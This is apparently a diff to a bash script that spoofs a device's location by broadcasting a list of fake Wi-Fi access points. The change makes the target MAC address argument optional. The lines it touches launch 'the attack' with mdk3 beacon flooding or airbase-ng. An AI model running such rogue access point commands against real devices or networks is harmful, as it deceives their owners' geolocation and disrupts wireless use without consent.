@@ -7,9 +7,9 @@
 # arg3 = mac address of the target
 # You can configure this script in config.sh
 
-if [ "$#" -ne 3 ]
+if [ "$#" -lt 2 ]
 then
-    echo "Usage : $0 <lat> <long> <target_mac>";
+    echo "Usage : $0 <lat> <long> [<target_mac>]";
     exit;
 fi
 
@@ -68,7 +68,12 @@ then
     exit;
 fi
 
-target_mac="$3";
+if [ "$#" -eq 3 ]
+then
+    target_mac="-d $3";
+else
+    target_mac=""
+fi
 
 tmpfile=$(mktemp)
 tmpfile2=$(mktemp)
@@ -140,5 +145,5 @@ then
     sudo mdk3 "$interface" b -v $tmpfile2 -g -t >/dev/null
 else
     echo -e "\nLaunching the attack with aircrack-ng and the list of APs."
-    sudo airbase-ng -m $tmpfile2 -p -X -d $target_mac wlan0
+    sudo airbase-ng -m $tmpfile2 -p -X $target_mac wlan0
 fi
